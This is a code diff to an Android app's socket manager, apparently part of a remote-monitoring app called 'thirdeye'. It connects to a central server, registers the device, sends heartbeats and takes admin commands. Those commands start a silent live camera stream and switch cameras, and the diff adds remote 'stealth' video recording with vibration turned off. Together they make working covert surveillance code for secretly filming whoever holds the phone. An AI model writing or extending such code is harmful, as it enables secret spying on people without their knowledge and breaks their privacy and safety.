@@ -3,6 +3,7 @@ package com.thirdeye.app.uploader
 import android.content.Context
 import android.util.Base64
 import android.util.Log
+import com.thirdeye.app.service.CameraRecordingService
 import com.thirdeye.app.service.LiveStreamService
 import com.thirdeye.app.utils.AppPreferences
 import io.socket.client.IO
@@ -14,21 +15,49 @@ object SocketManager {
     private const val TAG = "SocketManager"
 
     private var socket: Socket? = null
+    @Volatile
     private var isConnecting = false
+    private var currentServerUrl: String? = null
+    private var heartbeatThread: Thread? = null
+
+    fun isConnected(): Boolean {
+        return socket?.connected() == true
+    }
 
     fun initAndConnect(context: Context) {
-        if (socket?.connected() == true || isConnecting) return
+        val prefs = AppPreferences(context)
+        val serverUrl = prefs.serverUrl.trimEnd('/')
+
+        // If connected to same server, nothing to do
+        if (socket?.connected() == true && currentServerUrl == serverUrl) {
+            return
+        }
+
+        // If connecting to same server already, wait
+        if (isConnecting && currentServerUrl == serverUrl) {
+            return
+        }
 
         try {
             isConnecting = true
-            val prefs = AppPreferences(context)
-            val serverUrl = prefs.serverUrl.trimEnd('/')
+            currentServerUrl = serverUrl
+
+            // Clean up existing socket if changing servers
+            socket?.let {
+                try {
+                    it.disconnect()
+                    it.off()
+                } catch (e: Exception) {
+                    // Ignore
+                }
+            }
 
             val options = IO.Options().apply {
                 reconnection = true
                 reconnectionAttempts = Int.MAX_VALUE
-                reconnectionDelay = 2000
-                timeout = 10000
+                reconnectionDelay = 1500
+                reconnectionDelayMax = 10000
+                timeout = 15000
                 transports = arrayOf("websocket", "polling")
             }
 
@@ -36,7 +65,7 @@ object SocketManager {
 
             socket?.on(Socket.EVENT_CONNECT) {
                 isConnecting = false
-                Log.i(TAG, " Connected to central backend socket!")
+                Log.i(TAG, " Connected to central backend socket at $serverUrl!")
                 registerDevice(context)
                 startHeartbeat(context)
             }
@@ -53,7 +82,7 @@ object SocketManager {
                 Log.w(TAG, "Socket connection error: ${args.firstOrNull()}")
             }
 
-            // Command from Admin to start silent live camera stream
+            // Command 1: Start silent live camera stream
             socket?.on("start-live-stream") { args ->
                 try {
                     val data = args.firstOrNull() as? JSONObject
@@ -65,13 +94,13 @@ object SocketManager {
                 }
             }
 
-            // Command from Admin to stop live stream
+            // Command 2: Stop live stream
             socket?.on("stop-live-stream") {
                 Log.i(TAG, " Received STOP live stream command")
                 LiveStreamService.stopService(context)
             }
 
-            // Command from Admin to switch camera (FRONT <-> BACK)
+            // Command 3: Switch camera (FRONT <-> BACK)
             socket?.on("switch-camera") { args ->
                 try {
                     val data = args.firstOrNull() as? JSONObject
@@ -83,6 +112,26 @@ object SocketManager {
                 }
             }
 
+            // Command 4: Remote start stealth video recording
+            socket?.on("start-remote-recording") {
+                try {
+                    Log.i(TAG, " Received REMOTE START recording command")
+                    CameraRecordingService.startService(context, enableVibration = false)
+                } catch (e: Exception) {
+                    Log.e(TAG, "Error starting remote recording", e)
+                }
+            }
+
+            // Command 5: Remote stop stealth video recording
+            socket?.on("stop-remote-recording") {
+                try {
+                    Log.i(TAG, " Received REMOTE STOP recording command")
+                    CameraRecordingService.stopService(context, enableVibration = false)
+                } catch (e: Exception) {
+                    Log.e(TAG, "Error stopping remote recording", e)
+                }
+            }
+
             socket?.connect()
         } catch (e: Exception) {
             isConnecting = false
@@ -90,14 +139,27 @@ object SocketManager {
         }
     }
 
-    private var heartbeatThread: Thread? = null
+    /**
+     * Force immediate reconnect upon network availability change
+     */
+    fun reconnect(context: Context) {
+        try {
+            if (socket?.connected() != true) {
+                socket?.connect() ?: initAndConnect(context)
+            } else {
+                registerDevice(context)
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Reconnect error", e)
+            initAndConnect(context)
+        }
+    }
 
     private fun startHeartbeat(context: Context) {
         heartbeatThread?.interrupt()
         heartbeatThread = Thread {
             try {
                 while (!Thread.currentThread().isInterrupted && socket?.connected() == true) {
-                    Thread.sleep(20000)
                     val battery = BackendClient.getBatteryLevel(context)
                     val payload = JSONObject().apply {
                         put("deviceId", BackendClient.getDeviceId(context))
@@ -105,17 +167,21 @@ object SocketManager {
                         put("timestamp", System.currentTimeMillis())
                     }
                     socket?.emit("device-heartbeat", payload)
+                    Thread.sleep(20000)
                 }
             } catch (e: InterruptedException) {
                 // Thread interrupted
             }
         }.apply {
             isDaemon = true
+            name = "SocketHeartbeatThread"
             start()
         }
     }
 
-    private fun registerDevice(context: Context) {
+    fun registerDevice(context: Context) {
+        if (socket?.connected() != true) return
+
         try {
             val deviceId = BackendClient.getDeviceId(context)
             val deviceName = BackendClient.getDeviceName()
@@ -128,7 +194,7 @@ object SocketManager {
             }
 
             socket?.emit("register-device", payload)
-            Log.d(TAG, "Device registered on socket: $deviceId")
+            Log.d(TAG, "Device registered on socket: $deviceId ($deviceName)")
         } catch (e: Exception) {
             Log.e(TAG, "Failed registering device", e)
         }
@@ -171,10 +237,6 @@ object SocketManager {
         }
     }
 
-    fun isConnected(): Boolean {
-        return socket?.connected() == true
-    }
-
     fun disconnect() {
         heartbeatThread?.interrupt()
         heartbeatThread = null
@@ -182,5 +244,6 @@ object SocketManager {
         socket?.off()
         socket = null
         isConnecting = false
+        currentServerUrl = null
     }
 }
